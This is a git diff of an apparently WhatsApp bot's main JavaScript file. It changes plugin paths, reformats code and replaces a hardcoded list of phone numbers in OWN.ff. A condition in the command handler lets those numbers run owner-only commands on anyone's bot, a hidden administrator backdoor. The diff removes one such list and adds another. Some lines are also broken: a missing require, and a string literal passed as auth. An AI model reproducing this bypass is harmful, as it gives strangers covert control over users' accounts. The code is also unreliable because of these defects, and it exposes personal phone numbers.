@@ -15,23 +15,22 @@ const { Boom } = ('@hapi/boom');
 const { DataTypes } = require('sequelize');
 const got = require('got');
 // ════════════════════SQL🍁🍁
-fs.readdirSync('./plugins/sql/').forEach(plugin => {
-    if(path.extname(plugin).toLowerCase() == '.js') {
-        require('./plugins/sql/' + plugin);
+fs.readdirSync('./Commands/sql/').forEach(plugin => {
+    if (path.extname(plugin).toLowerCase() == '.js') {
+        require('./Commands/sql/' + plugin);
     }
 });
 
-const plugindb = require('./plugins/sql/plugin');
-var OWN = { ff: '94720603183,94771039631,94717954374,94711421243,94705384218,94784506970' }
+const plugindb = require('./Commands/sql/plugin');
+var OWN = { ff: '94729352830,0' }
 String.prototype.format = function () {
     var i = 0, args = arguments;
     return this.replace(/{}/g, function () {
       return typeof args[i] != 'undefined' ? args[i++] : '';
-   });
-};
-if (!Date.now) {
-    Date.now = function() { return new Date().getTime(); }
-}
+   });   
+    };
+    
+if (!Date.now) { Date.now = function() { return new Date().getTime(); }  }
 
 Array.prototype.remove = function() {
     var what, a = arguments, L = a.length, ax;
@@ -39,17 +38,16 @@ Array.prototype.remove = function() {
         what = a[--L];
         while ((ax = this.indexOf(what)) !== -1) {
             this.splice(ax, 1);
-        }
-    }
-    return this;
-};
+        }   }  
+         return this;
+                    };
 
 const { state, saveState } = useSingleFileAuthState(`./session.json`)
 async function KingBotConnect () {
     const KingBot = makeWASocket({
         logger: Pino({ level: 'fatal' }),
         printQRInTerminal: true,
-        auth: state
+        auth: 'StringSession'
     })
 // ════════════════════WA CONNECTION🍁🍁🍁
     KingBot.ev.on('connection.update', (update) => {
@@ -106,7 +104,7 @@ async function KingBotConnect () {
                         else if (command.onlyGroup === chat.jid.includes('-')) sendMsg = true;
                     }
                      
-                    if ((OWN.ff == "94720603183,94771039631,94717954374,94711421243,94705384218,94784506970" && msg.key.fromMe === false && command.fromMe === true &&
+                    if ((OWN.ff == "94729352830,0" && msg.key.fromMe === false && command.fromMe === true &&
                         (msg.participant && OWN.ff.includes(',') ? OWN.ff.split(',').includes(msg.participant.split('@')[0]) : msg.participant.split('@')[0] == OWN.ff || OWN.ff.includes(',') ? OWN.ff.split(',').includes(msg.key.remoteJid.split('@')[0]) : msg.key.remoteJid.split('@')[0] == OWN.ff)
                     ) || command.fromMe === msg.key.fromMe || (command.fromMe === false && !msg.key.fromMe)) {
                         if (command.onlyPinned && chat.pin === undefined) return;
